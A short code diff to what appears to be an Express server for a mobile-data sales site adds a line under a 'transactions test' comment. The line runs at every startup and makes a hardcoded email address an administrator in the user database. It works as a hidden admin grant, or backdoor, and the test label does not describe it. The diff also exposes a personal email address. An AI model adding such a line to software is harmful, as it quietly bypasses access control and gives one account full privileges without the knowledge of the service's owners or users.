@@ -1596,6 +1596,7 @@ app.post("/api/orders", requireUser, async (req, res) => {
 // =========================
 // ERICODATA TRANSACTIONS TEST
 // =========================
+  db.run("UPDATE users SET is_admin = 1 WHERE email = ?", ["adesinamayowaenterprise@gmail.com"]); saveDatabase();
 app.listen(PORT, "0.0.0.0", () => {
   console.log(
     "CheapData server running on port " + PORT
